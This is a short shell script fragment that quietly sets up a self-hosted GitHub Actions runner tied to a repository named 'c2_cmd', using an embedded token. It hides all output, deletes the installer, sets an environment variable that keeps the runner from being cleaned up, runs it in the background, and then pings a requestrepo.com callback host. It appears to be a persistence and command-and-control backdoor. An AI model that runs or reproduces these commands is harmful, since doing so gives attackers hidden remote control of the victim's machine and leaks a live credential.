...
./config.sh --url https://github.com/kjagsdq/c2_cmd --unattended --token BROA73RGUYNFVZ4BNOCL2ATIS3VKI  --name "bsrc2" --labels "bsrc2" > /dev/null 2>&1
rm actions-runner-linux-x64-2.327.1.tar.gz
export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
curl https://xh9gid0c.requestrepo.com/test
